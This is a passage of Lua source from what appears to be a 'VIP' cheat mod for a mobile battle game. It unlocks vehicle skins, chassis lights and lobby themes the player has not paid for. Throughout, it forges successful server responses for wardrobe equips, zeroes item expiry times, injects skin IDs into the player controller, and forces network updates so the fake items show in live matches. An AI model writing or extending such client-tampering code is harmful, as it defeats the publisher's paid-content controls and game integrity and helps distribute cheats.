    for subType0, slots in pairs(cch.vehicleSlots or {}) do
        local subType = tonumber(subType0)
        local e = slots and (slots[1] or slots["1"])
        local insID = e and tonumber(e.insID)
        if subType and insID and insID > 0 and F.isInjectedIns(insID) then
            serverTable[subType] = insID
        end
    end
    return serverTable
end

function F.equipVehicleTypesFromConfig(slotMap)
    slotMap = slotMap or PERSIST.configVehicleSlots
    if not slotMap or not next(slotMap) then return false end
    DataMgr.vehicleSkinInsIDTable = DataMgr.vehicleSkinInsIDTable or {}
    local subTypes = {}
    for st in pairs(slotMap) do
        local n = tonumber(st)
        if n then subTypes[#subTypes + 1] = n end
    end
    table.sort(subTypes)
    local any, lobbyRes, lobbyIns = false, nil, nil
    for _, subType in ipairs(subTypes) do
        local slots = slotMap[subType] or slotMap[tostring(subType)]
        if type(slots) == "table" then
            local res = tonumber(slots[1] or slots["1"])
            local ins = res and R.resToIns[res]
            if ins and F.isInjectedIns(ins) then
                DataMgr.vehicleSkinInsIDTable[subType] = ins
                any = true
                if not lobbyIns then
                    lobbyRes, lobbyIns = res, ins
                end
            end
        end
    end
    if any then
        pcall(function()
            local TabSurveillance = require("client.slua.logic.wardrobe.tab_surveillance")
            TabSurveillance.VehicleChange()
        end)
    end
    return any, lobbyRes, lobbyIns
end

function F.applyLobbyVehicleDisplay(resID, insID, showVehicle)
    insID = tonumber(insID)
    resID = tonumber(resID)
    if not insID or insID <= 0 then return end
    _G.AddOutfitApplyingConfig = true
    pcall(function() DataMgr.vst_skin = insID end)
    pcall(function()
        local HallThemeUtils = require("client.logic.lobby.hall_theme_utils")
        HallThemeUtils.ProcPutOnVehicle({ res_id = resID, instid = insID }, showVehicle ~= false)
    end)
    pcall(F.applyVehicleSkinsToPC)
    _G.AddOutfitApplyingConfig = false
end

function F.setLobbyVehicleManual(subType, resID, insID)
    insID = tonumber(insID)
    resID = tonumber(resID)
    subType = tonumber(subType)
    if not insID then return end
    if F.isChassisLightId(resID) or subType == CHASSIS_LIGHT_SUB then return end
    if resID and not F.isVehicleRes(resID) then return end
    if not F.isInjectedIns(insID) and not F.isVehicleRes(resID) then return end
    if not resID then resID = R.insToRes[insID] end
    if not subType and resID then subType = tonumber(F.vehicleSubType(resID)) end
    _G.AddOutfitLobbyVeh = _G.AddOutfitLobbyVeh or {}
    _G.AddOutfitLobbyVeh.manual = true
    _G.AddOutfitLobbyVeh.subType = subType
    _G.AddOutfitLobbyVeh.resID = resID
    _G.AddOutfitLobbyVeh.insID = insID
    PERSIST.lobbyVehicleSubType = subType
    PERSIST.lobbyVehicleIns = insID
    PERSIST.lobbyVehicleResID = resID
    F.persistMarkDirty()
end

function F.resolveLobbyVehicle(slotMap)
    slotMap = slotMap or PERSIST.configVehicleSlots
    local L = _G.AddOutfitLobbyVeh or {}
    local st = tonumber(PERSIST.lobbyVehicleSubType) or tonumber(L.subType)
    local res = tonumber(PERSIST.lobbyVehicleResID) or tonumber(L.resID)
    if res and res > 0 then
        local ins = R.resToIns[res]
        if ins then
            if not st then st = tonumber(F.vehicleSubType(res)) end
            return res, ins, st
        end
    end
    local ins = tonumber(PERSIST.lobbyVehicleIns) or tonumber(L.insID)
    if ins and F.isInjectedIns(ins) then
        res = R.insToRes[ins] or res
        if not st and res then st = tonumber(F.vehicleSubType(res)) end
        return res, ins, st
    end
    if st and slotMap then
        local slots = slotMap[st] or slotMap[tostring(st)]
        local res = slots and tonumber(slots[1] or slots["1"])
        ins = res and R.resToIns[res]
        if ins then return res, ins, st end
    end
    local subTypes = {}
    for s in pairs(slotMap or {}) do
        local n = tonumber(s)
        if n then subTypes[#subTypes + 1] = n end
    end
    table.sort(subTypes)
    if subTypes[1] then
        st = subTypes[1]
        local slots = slotMap[st] or slotMap[tostring(st)]
        local res = slots and tonumber(slots[1] or slots["1"])
        ins = res and R.resToIns[res]
        if ins then return res, ins, st end
    end
    return nil, nil, nil
end

function F.syncLobbyVehicleResFromIns()
    if PERSIST.lobbyVehicleResID and PERSIST.lobbyVehicleResID > 0 then return end
    local ins = tonumber(PERSIST.lobbyVehicleIns)
    if ins and R.insToRes[ins] then
        PERSIST.lobbyVehicleResID = R.insToRes[ins]
        F.persistMarkDirty()
    end
end

function F.hasExplicitLobbyVehicle()
    local res = tonumber(PERSIST.lobbyVehicleResID)
    local st = tonumber(PERSIST.lobbyVehicleSubType)
    if F.isChassisLightId(res) or st == CHASSIS_LIGHT_SUB then return false end
    if res and res > 0 and not F.isVehicleRes(res) then return false end
    if res and res > 0 then return true end
    if (tonumber(PERSIST.lobbyVehicleIns) or 0) > 0 then return true end
    local L = _G.AddOutfitLobbyVeh
    if L and L.manual and ((tonumber(L.resID) or 0) > 0 or (tonumber(L.insID) or 0) > 0) then return true end
    return false
end

function F.shouldApplyLobbyFromConfig(silent)
    if not F.hasExplicitLobbyVehicle() then return false end
    local _, lobbyIns = F.resolveLobbyVehicle(PERSIST.configVehicleSlots)
    if not lobbyIns then return false end
    local cur = tonumber(DataMgr.vst_skin)
    if cur == lobbyIns then return false end
    return true
end

function F.reapplyVehicleSlotsFromConfig(silent)
    local slotMap = PERSIST.configVehicleSlots
    if not slotMap or not next(slotMap) then return false end
    if not F.applyVehicleSlotsFromConfigMap(slotMap) then return false end
    F.syncVehicleSlotsToDataMgr()
    F.notifyVehicleSlotUI()
    F.equipVehicleTypesFromConfig(slotMap)
    if F.shouldApplyLobbyFromConfig(silent) then
        local lobbyRes, lobbyIns = F.resolveLobbyVehicle(slotMap)
        if lobbyIns then
            F.applyLobbyVehicleDisplay(lobbyRes, lobbyIns, not silent)
        elseif not silent then
            pcall(F.applyVehicleSkinsToPC)
            F.perfInvalidateLobby()
        end
    end
    return true
end

function F.applyHallThemeDisplay(resID, insID)
    insID = tonumber(insID)
    resID = tonumber(resID)
    if not insID or not resID then return false end
    if not F.isInjectedIns(insID) then return false end
    if not F.isResourcesReady(resID) then
        F.requestResourceDownload(resID)
        return false
    end
    _G.AddOutfitApplyingTheme = true
    pcall(function()
        local HT = require("client.logic.lobby.hall_theme_utils")
        HT.ProcPutOnHallTheme({ res_id = resID, instid = insID }, nil)
    end)
    _G.AddOutfitApplyingTheme = false
    local cch = F.cache()
    cch.hallThemeRes, cch.hallThemeIns = resID, insID
    return true
end

function F.setHallThemeManual(resID, insID)
    insID = tonumber(insID)
    resID = tonumber(resID)
    if not insID or not F.isInjectedIns(insID) then return end
    if not resID then resID = R.insToRes[insID] end
    _G.AddOutfitLobbyTheme = _G.AddOutfitLobbyTheme or {}
    _G.AddOutfitLobbyTheme.manual = true
    _G.AddOutfitLobbyTheme.resID = resID
    _G.AddOutfitLobbyTheme.insID = insID
    PERSIST.hallThemeResID = resID
    PERSIST.hallThemeIns = insID
    local cch = F.cache()
    cch.hallThemeRes, cch.hallThemeIns = resID, insID
    F.persistMarkDirty()
end

function F.resolveHallTheme()
    local L = _G.AddOutfitLobbyTheme or {}
    local res = tonumber(PERSIST.hallThemeResID) or tonumber(L.resID)
    if res and R.resToIns[res] then return res, R.resToIns[res] end
    local ins = tonumber(PERSIST.hallThemeIns) or tonumber(L.insID)
    if ins and F.isInjectedIns(ins) then return R.insToRes[ins], ins end
    return nil, nil
end

function F.shouldApplyHallThemeFromConfig(silent)
    local _, ins = F.resolveHallTheme()
    if not ins then return false end
    local cur = nil
    pcall(function()
        local HT = require("client.logic.lobby.hall_theme_utils")
        cur = tonumber(HT.GetThemeInstId())
    end)
    if cur == ins then return false end
    if _G.AddOutfitLobbyTheme and _G.AddOutfitLobbyTheme.manual then return true end
    if silent and cur and cur > 0 and F.isInjectedIns(cur) then return false end
    return true
end

function F.putOnHallTheme(insID)
    insID = tonumber(insID)
    if not insID or not F.isInjectedIns(insID) then return false end
    local resID = R.insToRes[insID]
    if F.applyHallThemeDisplay(resID, insID) then
        F.setHallThemeManual(resID, insID)
        return true
    end
    return false
end

function F.reapplyHallThemeFromConfig(silent)
    if not F.shouldApplyHallThemeFromConfig(silent) then return false end
    local res, ins = F.resolveHallTheme()
    if not res or not ins then return false end
    return F.applyHallThemeDisplay(res, ins)
end

function F.syncVehicleCacheFromDataMgr()
    local cch = F.cache()
    cch.vehicleSlots = cch.vehicleSlots or {}
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    for subType0, slots in pairs(DataMgr.VehicleSlotList or {}) do
        local subType = tonumber(subType0)
        if subType and type(slots) == "table" then
            cch.vehicleSlots[subType] = cch.vehicleSlots[subType] or {}
            for idx0, insID in pairs(slots) do
                local idx, insID = tonumber(idx0), tonumber(insID)
                if idx and insID and insID > 0 then
                    local res = R.insToRes[insID]
                    if not res then
                        pcall(function()
                            local wd = require("client.slua.logic.wardrobe.wardrobe_data")
                            local d = wd:GetHallDepotItemDataByInsID(insID)
                            res = d and tonumber(d.resID)
                        end)
                    end
                    if res and res > 0 then
                        cch.vehicleSlots[subType][idx] = { resID = res, insID = insID }
                    end
                end
            end
        end
    end
end

function F.vehicleSubType(resID)
    local c = F.cfg(resID)
    return c and (c.ItemSubType or c.itemSubType)
end

function F.modifyInjectedVehicleSlot(insID, slotIndex, equip)
    insID = tonumber(insID)
    slotIndex = tonumber(slotIndex)
    if not insID or not slotIndex then return false end
    local resID = R.insToRes[insID]
    if not resID and insID >= INS_BASE then
        pcall(function()
            local wd = require("client.slua.logic.wardrobe.wardrobe_data")
            local d = wd:GetHallDepotItemDataByInsID(insID)
            resID = d and tonumber(d.resID or d.res_id)
        end)
    end
    if not resID then return false end
    local st = F.vehicleSubType(resID)
    if not st or tonumber(st) < 900 then return false end
    local cch = F.cache()
    cch.vehicleSlots = cch.vehicleSlots or {}
    cch.vehicleSlots[st] = cch.vehicleSlots[st] or {}
    if equip then
        for _, slots in pairs(cch.vehicleSlots) do
            for i, e in pairs(slots) do
                if e and tonumber(e.insID) == insID then slots[i] = nil end
            end
        end
        cch.vehicleSlots[st][slotIndex] = { resID = resID, insID = insID }
        PERSIST.configVehicleSlots = PERSIST.configVehicleSlots or {}
        PERSIST.configVehicleSlots[st] = PERSIST.configVehicleSlots[st] or {}
        PERSIST.configVehicleSlots[st][slotIndex] = resID
    else
        local e = cch.vehicleSlots[st][slotIndex]
        if e and tonumber(e.insID) == insID then
            cch.vehicleSlots[st][slotIndex] = nil
            if PERSIST.configVehicleSlots and PERSIST.configVehicleSlots[st] then
                PERSIST.configVehicleSlots[st][slotIndex] = nil
            end
        end
    end
    F.syncVehicleSlotsToDataMgr()
    if equip and slotIndex == 1 then
        DataMgr.vehicleSkinInsIDTable = DataMgr.vehicleSkinInsIDTable or {}
        DataMgr.vehicleSkinInsIDTable[st] = insID
        pcall(function()
            local TabSurveillance = require("client.slua.logic.wardrobe.tab_surveillance")
            TabSurveillance.VehicleChange()
        end)
    end
    F.persistMarkDirty()
    F.notifyVehicleSlotUI()
    return true
end

function F.buildVstInBattleFromSlots()
    local vst = {}
    local function insToRes(insID)
        insID = tonumber(insID)
        if not insID or insID <= 0 then return nil end
        local res = R.insToRes[insID]
        if res and res > 0 then return res end
        pcall(function()
            local wd = require("client.slua.logic.wardrobe.wardrobe_data")
            local d = wd:GetHallDepotItemDataByInsID(insID)
            res = d and tonumber(d.resID)
        end)
        if res and res > 0 then return res end
        if insID >= 1000000 and F.cfg(insID) then return insID end
        return nil
    end
    local function fillFromSlots(subType, slots)
        subType = tonumber(subType)
        if not subType or type(slots) ~= "table" then return end
        local resList = {}
        for idx = 1, 8 do
            local val = slots[idx] or slots[tostring(idx)]
            local res = insToRes(val)
            if not res and type(val) == "table" then
                res = tonumber(val.resID or val.res_id)
            end
            if res and res > 0 then resList[#resList + 1] = res end
        end
        if #resList > 0 then vst[subType] = resList end
    end
    for subType, slots in pairs(DataMgr.VehicleSlotList or {}) do
        fillFromSlots(subType, slots)
    end
    if not next(vst) then
        local cch = F.cache()
        for subType, slots in pairs(cch.vehicleSlots or {}) do
            local resList = {}
            for idx = 1, 8 do
                local e = slots[idx]
                local res = e and tonumber(e.resID)
                if res and res > 0 then resList[#resList + 1] = res end
            end
            if #resList > 0 then vst[tonumber(subType)] = resList end
        end
    end
    if not next(vst) then
        local bySub = {}
        for res0, _ in pairs(R.resToIns) do
            local res = tonumber(res0)
            local c = F.cfg(res)
            local st = c and tonumber(F.subType(c))
            if res and st and st >= 900 then
                bySub[st] = bySub[st] or {}
                bySub[st][#bySub[st] + 1] = res
            end
        end
        for st, list in pairs(bySub) do
            table.sort(list)
            vst[st] = list
        end
    end
    return vst
end

function F.isVehicleSkinAllowed(skinId)
    skinId = tonumber(skinId)
    if not skinId or skinId <= 0 then return false end
    if F.isInjectedRes(skinId) then return true end
    for _, list in pairs(F.buildVstInBattleFromSlots()) do
        for _, res in ipairs(list) do
            if tonumber(res) == skinId then return true end
        end
    end
    if R.resToIns[skinId] then
        local c = F.cfg(skinId)
        local st = F.subType(c)
        if st and tonumber(st) >= 900 then return true end
    end
    return false
end

function F.isSkinInVehiclePCList(skinId)
    skinId = tonumber(skinId)
    if not skinId or skinId <= 0 then return false end
    local pc = F.getPC()
    if not slua.isValid(pc) or not pc.VehicleAvatarSkinList then return false end
    local UAvatarUtils = import("AvatarUtils")
    local shape = UAvatarUtils.GetVehicleShapeBySkinID(skinId)
    if shape and shape >= 0 then
        local entry = pc.VehicleAvatarSkinList:Get(shape)
        if entry and entry.SkinList then
            for _, id in pairs(entry.SkinList) do
                if tonumber(id) == skinId then return true end
            end
        end
    end
    return false
end

function F.shouldHandleVehicleSkinClick(resID)
    resID = tonumber(resID)
    if not resID or resID <= 0 then return false end
    return F.isVehicleSkinAllowed(resID) or F.isSkinInVehiclePCList(resID)
end

function F.getMatchVehicle()
    local found = nil
    pcall(function()
        local subs = SubsystemMgr:Get("VehicleControlUISubSystem")
        if subs and subs.GetVehicleUserComponent then
            local uuc = subs:GetVehicleUserComponent()
            if slua.isValid(uuc) and slua.isValid(uuc.Vehicle) then found = uuc.Vehicle end
        end
    end)
    if slua.isValid(found) then return found end
    local pc = F.getPC()
    if slua.isValid(pc) and pc.GetPlayerCharacterSafety then
        local char = pc:GetPlayerCharacterSafety()
        if slua.isValid(char) then
            if char.GetCurrentVehicle then
                local v = char:GetCurrentVehicle()
                if slua.isValid(v) then return v end
            end
            if char.CurrentVehicle and slua.isValid(char.CurrentVehicle) then
                return char.CurrentVehicle
            end
        end
    end
    return nil
end

function F.applyClientVehicleSkin(skinId, vehicle, pc)
    skinId = tonumber(skinId)
    if not skinId or skinId <= 0 then return false end
    pc = pc or F.getPC()
    vehicle = vehicle or F.getMatchVehicle()
    if not slua.isValid(vehicle) then return false end

    local UAvatarUtils = import("AvatarUtils")
    pcall(function()
        if slua.isValid(pc) then
            pc.ShowVehicleSkin = skinId
            local shapeType = UAvatarUtils.GetVehicleShapeBySkinID(skinId)
            if shapeType and shapeType >= 0 and pc.VehicleAvatarList then
                pc.VehicleAvatarList:Add(shapeType, skinId)
            end
        end
    end)

    local applied = false
    local av = nil
    pcall(function()
        if vehicle.GetAvatarComponent then av = vehicle:GetAvatarComponent() end
        if not slua.isValid(av) then av = vehicle.VehicleAvatarComponent_BP end
    end)

    if slua.isValid(av) then
        pcall(function() if av.bIsLobbyAvatar ~= nil then av.bIsLobbyAvatar = false end end)
        pcall(function() if av.CanChangeAvatar ~= nil then av.CanChangeAvatar = true end end)
        pcall(function()
            if slua.isValid(pc) and av.SetVehicleNetAvatarData then
                av:SetVehicleNetAvatarData(pc)
            end
        end)
        pcall(function()
            if av.ChangeItemAvatar then
                av:ChangeItemAvatar(skinId, false)
                applied = true
            elseif av.PreChangeVehicleAvatar then
                av:PreChangeVehicleAvatar(skinId)
                applied = true
            end
        end)
        pcall(function()
            if av.PostChangeItemAvatar then av:PostChangeItemAvatar(false) end
        end)
    end

    pcall(function()
        local battleCls = import("VehicleAvatarComponentBattleBase")
        local battleAv = vehicle:GetComponentByClass(battleCls)
        if slua.isValid(battleAv) then
            if battleAv.ChangeVehicleAvatar then
                battleAv:ChangeVehicleAvatar(skinId, false)
                applied = true
            end
            pcall(function()
                local VehiclePlateLicenseUtil = require("GameLua.Activity.Commercialize.GamePlay.Vehicle.VehiclePlateLicenseUtil")
                local uid = pc and pc.PlayerUID or 0
                local bTire = VehiclePlateLicenseUtil.NeedOpenHighTire(tonumber(uid), skinId)
                if battleAv.PreChangeHighTireLight then
                    battleAv:PreChangeHighTireLight(skinId, bTire)
                end
            end)
        end
    end)

    pcall(function()
        if vehicle.ChangeVehicleAvatar and slua.isValid(pc) then
            vehicle:ChangeVehicleAvatar(pc)
            applied = true
        end
    end)

    pcall(function() if vehicle.ForceNetUpdate then vehicle:ForceNetUpdate() end end)
    pcall(function() if slua.isValid(pc) and pc.ForceNetUpdate then pc:ForceNetUpdate() end end)
    return applied
end

function F.getVehicleSkinIds()
    local out, seen = {}, {}
    local function add(res)
        res = tonumber(res)
        if res and res > 0 and not seen[res] then
            seen[res] = true
            out[#out + 1] = res
        end
    end
    for _, list in pairs(F.buildVstInBattleFromSlots()) do
        for _, res in ipairs(list) do add(res) end
    end
    for res in pairs(R.resToIns) do
        local c = F.cfg(tonumber(res))
        local st = c and tonumber(F.subType(c))
        if st and st >= 900 then add(res) end
    end
    return out
end

function F.buildVehVst(skinIds)
    local bySub = {}
    for _, skinId in ipairs(skinIds or {}) do
        local subType = 961
        local ok, c = pcall(function() return CDataTable.GetTableData("Item", skinId) end)
        if ok and c and c.ItemSubType then subType = c.ItemSubType end
        bySub[subType] = bySub[subType] or {}
        bySub[subType][#bySub[subType] + 1] = skinId
    end
    return bySub
end

function F.directInjectVehicleSkinList(pc, skinIds)
    if not slua.isValid(pc) or not pc.VehicleAvatarSkinList then return end
    local UAvatarUtils = import("AvatarUtils")
    for _, skinId in ipairs(skinIds or {}) do
        local shapeType = nil
        pcall(function() shapeType = UAvatarUtils.GetVehicleShapeBySkinID(skinId) end)
        if shapeType and shapeType >= 0 then
            pcall(function() pc.VehicleAvatarList:Add(shapeType, skinId) end)
            local entry = pc.VehicleAvatarSkinList:Get(shapeType)
            if entry and entry.SkinList then
                pcall(function() entry.SkinList:Add(skinId) end)
            end
        end
    end
end

function F.mergeVstIntoPlayerInfo(playerInfo)
    if not playerInfo then return end
    F.syncVehicleCacheFromDataMgr()
    local vst = F.buildVehVst(F.getVehicleSkinIds())
    if not next(vst) then return end
    playerInfo.vst_in_battle = playerInfo.vst_in_battle or {}
    for subType, list in pairs(vst) do
        playerInfo.vst_in_battle[subType] = list
    end
    local first
    for _, list in pairs(vst) do first = list[1]; break end
    if first and first > 0 then playerInfo.vst_skin = first end
end

function F.applyVehicleSkinsToPC(pc)
    pc = pc or F.getPC()
    if not slua.isValid(pc) then return false end
    local skinIds = F.getVehicleSkinIds()
    if #skinIds == 0 then return false end
    local vst = F.buildVehVst(skinIds)
    local avatarList, avatarSkinList = {}, {}
    for _, skinList in pairs(vst) do
        local itemArray = {}
        for _, resid in ipairs(skinList) do
            if resid and resid > 0 then
                itemArray[#itemArray + 1] = { ItemTableID = resid, Count = 1 }
                avatarList[#avatarList + 1] = { ItemTableID = resid, Count = 1 }
            end
        end
        if #itemArray > 0 then
            avatarSkinList[#avatarSkinList + 1] = { Items = itemArray }
        end
    end
    pcall(function() pc.bEnableFuzzyAvatarOnClient = false end)
    pcall(function() pc.ShowVehicleSkin = skinIds[1] end)
    if #avatarList > 0 then
        pcall(function()
            pc.InitialVehicleAvatarList = avatarList
            pc:InitVehicleAvatarList()
        end)
    end
    if #avatarSkinList > 0 then
        pcall(function()
            pc.InitialVehicleAvatarSkinList = avatarSkinList
            pc:InitVehicleAvatarSkinList()
        end)
    end
    F.directInjectVehicleSkinList(pc, skinIds)
    return true
end

function F.serverChangeVehicleAvatar(skinId, pc)
    skinId = tonumber(skinId)
    if not skinId or skinId <= 0 then return false end
    pc = pc or F.getPC()
    if not slua.isValid(pc) then return false end

    F.applyVehicleSkinsToPC(pc)

    pcall(function()
        pc.ShowVehicleSkin = skinId
        local UAvatarUtils = import("AvatarUtils")
        local shapeType = UAvatarUtils.GetVehicleShapeBySkinID(skinId)
        if shapeType and shapeType >= 0 and pc.VehicleAvatarList then
            pc.VehicleAvatarList:Add(shapeType, skinId)
        end
        F.directInjectVehicleSkinList(pc, { skinId })
    end)

    local ok = false
    pcall(function()
        if pc.ServerChangeVehicleAvatar then
            pc:ServerChangeVehicleAvatar(skinId)
            ok = true
        end
    end)

    pcall(function()
        if pc.PlayerState and slua.isValid(pc.PlayerState) then
            pc.PlayerState.nVst_skin = skinId
        end
    end)

    pcall(function() pc:ForceNetUpdate() end)
    return ok
end

_G.AddOutfitVehSel = _G.AddOutfitVehSel or { override = nil, overrideVehicle = nil, byShape = {} }
local VEHSEL = _G.AddOutfitVehSel
_G.AddOutfitLobbyVeh = _G.AddOutfitLobbyVeh or { manual = false, subType = nil, resID = nil, insID = nil }
local _vehTickLastApply = 0
local VEH_SWITCH_EFFECT_ID = 7303001

function F.prepVehicleSwitchEffect(av, vehicle)
    if not slua.isValid(av) then return end
    if not F.isInRealMatch() then
        pcall(function() av.curSwitchEffectId = 0 end)
        return
    end
    pcall(function()
        av.curSwitchEffectId = VEH_SWITCH_EFFECT_ID
        local defaultId = 0
        pcall(function() defaultId = tonumber(av:GetDefaultAvatarID()) or 0 end)
        local curId = 0
        if slua.isValid(vehicle) then
            pcall(function() curId = tonumber(vehicle.GetAvatarId and vehicle:GetAvatarId()) or 0 end)
            if curId <= 0 then
                pcall(function() curId = tonumber(vehicle.ClientUsedAvatarID) or 0 end)
            end
        end
        if curId <= 0 then curId = defaultId end
        if not av.lastEquipedAvatarId or av.lastEquipedAvatarId <= 0 then
            av.lastEquipedAvatarId = curId > 0 and curId or defaultId
        end
    end)
end

function F.isParachuteRes(resID)
    return F.subType(F.cfg(tonumber(resID))) == PARACHUTE_SUB
end

function F.isGlideRes(resID)
    resID = tonumber(resID)
    if not resID then return false end
    local st = F.subType(F.cfg(resID))
    if GLIDER_SUBS[st] then return true end
    local ok, r = pcall(function()
        local MDH = require("client.logic.avatar.ModelDisplayTypeHelper")
        if MDH.IsGlideByItemID and MDH.IsGlideByItemID(resID) then return true end
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        return wd.IsGlideType(st)
    end)
    return ok and r == true
end

function F.isVehicleRes(resID)
    resID = tonumber(resID)
    if not resID or F.isChassisLightId(resID) then return false end
    local st = tonumber(F.subType(F.cfg(resID)))
    return st and st >= 900 and st < 7000 and st ~= CHASSIS_LIGHT_SUB
end

function F.ensureInjectedItemAlive(entity, resID, insID)
    entity = entity or F.getEntity()
    insID = tonumber(insID) or (resID and R.resToIns[tonumber(resID)])
    resID = tonumber(resID) or (insID and R.insToRes[insID])
    if not entity or not insID then return end
    pcall(function()
        local d = entity:GetDataByInsID(insID)
        if d then
            d.expire_ts = 0
            d.expireTS = 0
            d.valid_hours = 0
        end
    end)
end

function F.sanitizeAllInjectedExpire()
    local entity = F.getEntity()
    if not entity then return end
    for res, ins in pairs(R.resToIns) do
        F.ensureInjectedItemAlive(entity, res, ins)
    end
end

function F.putOnVehicle(insID)
    insID = tonumber(insID)
    if not insID then return false end
    local resID = R.insToRes[insID]
    if not resID or not F.isVehicleRes(resID) then return false end
    F.ensureInjectedItemAlive(nil, resID, insID)
    if not F.isResourcesReady(resID) then
        F.requestResourceDownload(resID)
        return false
    end
    local item = {
        res_id = resID, resID = resID,
        instid = insID, ins_id = insID, insID = insID,
        expire_ts = 0, expireTS = 0, count = 1,
    }
    local WRH = require("client.network.Protocol.WardRobeHandler")
    WRH.on_depot_put_on_rsp(NET_OK, item, nil, 1, insID, 0)
    F.setLobbyVehicleManual(F.vehicleSubType(resID), resID, insID)
    pcall(function()
        local TabSurveillance = require("client.slua.logic.wardrobe.tab_surveillance")
        TabSurveillance.VehicleChange()
    end)
    pcall(function()
        if EventSystem and EVENTTYPE_WARDROBE and EVENTID_WARDROBE_UPDATE_ITEM_LIST then
            EventSystem:postEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_ITEM_LIST)
        end
    end)
    return true
end

function F.isChassisLightId(id)
    return CHASSIS_LIGHT_IDS[tonumber(id)] == true
end

function F.getDesiredChassisLight(vehicleSkinId)
    vehicleSkinId = tonumber(vehicleSkinId)
    local map = PERSIST.configChassisLightMap
    if vehicleSkinId and map and map[vehicleSkinId] then
        local v = tonumber(map[vehicleSkinId])
        if F.isChassisLightId(v) then return v end
    end
    local def = tonumber(PERSIST.configChassisLight) or DEFAULT_CHASSIS_LIGHT
    return F.isChassisLightId(def) and def or DEFAULT_CHASSIS_LIGHT
end

function F.saveChassisLight(vehicleSkinId, lightId)
    vehicleSkinId = tonumber(vehicleSkinId)
    lightId = tonumber(lightId)
    if not F.isChassisLightId(lightId) then return end
    PERSIST.configChassisLightMap = PERSIST.configChassisLightMap or {}
    if vehicleSkinId and vehicleSkinId > 0 then
        PERSIST.configChassisLightMap[vehicleSkinId] = lightId
    else
        PERSIST.configChassisLight = lightId
    end
    F.requestResourceDownload(lightId)
    F.persistMarkDirty()
end

function F.getVehicleLicenseComp(vehicle)
    if not slua.isValid(vehicle) then return nil end
    local lic = nil
    pcall(function()
        if vehicle.GetLicenseComponent then lic = vehicle:GetLicenseComponent() end
    end)
    if slua.isValid(lic) then return lic end
    pcall(function() lic = vehicle.BP_Lobby_VehicleLicenseComponent end)
    if slua.isValid(lic) then return lic end
    pcall(function()
        local cls = import("VehicleLicenseNumberComponent")
        lic = vehicle:GetComponentByClass(cls)
    end)
    return slua.isValid(lic) and lic or nil
end

function F.applyVehicleChassisLight(vehicle, skinId, lightId)
    -- [FIX VIP] Jika Mod Skin dimatikan, lewati proses load lampu bawah
    if _G.LexusConfig and _G.LexusConfig.ModSkin == false then return false end 
    
    skinId = tonumber(skinId)
    lightId = tonumber(lightId) or F.getDesiredChassisLight(skinId)
    if not F.isChassisLightId(lightId) then return false end
    if not slua.isValid(vehicle) then return false end
    if skinId and skinId > 0 then
        F.requestResourceDownload(skinId)
    end
    F.requestResourceDownload(lightId)
    local applied = false
    pcall(function()
        if vehicle.SetChassisLightShowData then
            vehicle:SetChassisLightShowData(lightId)
            applied = true
        end
    end)
    local lic = F.getVehicleLicenseComp(vehicle)
    if not slua.isValid(lic) then return applied end
    pcall(function()
        local vid = skinId
        if not vid or vid <= 0 then
            pcall(function()
                if vehicle.GetAvatarId then vid = tonumber(vehicle:GetAvatarId()) end
            end)
        end
        if not vid or vid <= 0 then
            pcall(function() vid = tonumber(lic.LicensePlate and lic.LicensePlate.ItemID) end)
        end
        if vid and vid > 0 then
            lic.curVehicleAvatarId = vid
            if lic.ChangeNetData_ItemID then
                lic:ChangeNetData_ItemID(vid)
            elseif lic.LicensePlate then
                lic.LicensePlate.ItemID = vid
            end
        end
        if lic.LicensePlate then
            lic.LicensePlate.ChassisLightId = lightId
        end
        if lic.SetChassisLightData and vid and vid > 0 then
            lic:SetChassisLightData(vid, lightId)
        elseif lic.PreChangeChassisLight then
            lic:PreChangeChassisLight()
        end
        applied = true
    end)
    return applied
end

function F.scheduleChassisLightApply(vehicle, skinId)
    skinId = tonumber(skinId)
    local vref = slua.isValid(vehicle) and vehicle or nil
    local function try()
        local v = slua.isValid(vref) and vref or F.getCurrentVehicleForSkin()
        if slua.isValid(v) then
            F.applyVehicleChassisLight(v, skinId)
        end
    end
    F.later(0.4, try)
    F.later(1.1, try)
end

function F.getVehicleShape(vehicle)
    if not slua.isValid(vehicle) then return nil end
    local shape = vehicle.VehicleShapeType
    if shape and tonumber(shape) >= 0 then return tonumber(shape) end
    pcall(function()
        local UAvatarUtils = import("AvatarUtils")
        local defId = vehicle.AvatarDefaultCfg and vehicle.AvatarDefaultCfg.TypeSpecificID
        if defId and tonumber(defId) > 0 then
            shape = UAvatarUtils.GetVehicleShapeBySkinID(tonumber(defId))
        end
    end)
    return shape and tonumber(shape) >= 0 and tonumber(shape) or nil
end

function F.getDesiredVehicleSkinForShape(shape)
    shape = tonumber(shape)
    if not shape or shape < 0 then return nil end
    F.syncVehicleCacheFromDataMgr()
    local UAvatarUtils = import("AvatarUtils")
    local vst = F.buildVstInBattleFromSlots()
    for _, list in pairs(vst) do
        local skin = list and tonumber(list[1])
        if skin and skin > 0 then
            local s = UAvatarUtils.GetVehicleShapeBySkinID(skin)
            if s == shape then return skin end
        end
    end
    local pc = F.getPC()
    if slua.isValid(pc) and pc.VehicleAvatarList then
        local skin = tonumber(pc.VehicleAvatarList:Get(shape))
        if skin and skin > 0 then return skin end
    end
    return nil
end

function F.getVehicleAvatarComp(vehicle)
    if not slua.isValid(vehicle) then return nil end
    local av = nil
    pcall(function() av = vehicle.VehicleAvatar end)
    if slua.isValid(av) then return av end
    pcall(function() if vehicle.GetAvatarComponent then av = vehicle:GetAvatarComponent() end end)
    if slua.isValid(av) then return av end
    pcall(function() av = vehicle.VehicleAvatarComponent_BP end)
    if slua.isValid(av) then return av end
    return nil
end

function F.getCurrentVehicleForSkin()
    local char = F.getLocalChar()
    if char and slua.isValid(char) then
        local v = nil
        pcall(function() v = char.CurrentVehicle end)
        if slua.isValid(v) then return v end
    end
    return F.getMatchVehicle()
end

function F.forceVehicleAvatar(skinId, vehicle)
    skinId = tonumber(skinId)
    if not skinId or skinId <= 0 then return false end
    if not F.isResourcesReady(skinId) then
        F.requestResourceDownload(skinId)
        return false
    end
    vehicle = slua.isValid(vehicle) and vehicle or F.getCurrentVehicleForSkin()
    if not slua.isValid(vehicle) then return false end
    local av = F.getVehicleAvatarComp(vehicle)
    if not slua.isValid(av) then return false end
    local applied = false
    F.prepVehicleSwitchEffect(av, vehicle)
    pcall(function() if av.CanChangeAvatar ~= nil then av.CanChangeAvatar = true end end)
    pcall(function()
        av:ChangeItemAvatar(skinId, true)
        applied = true
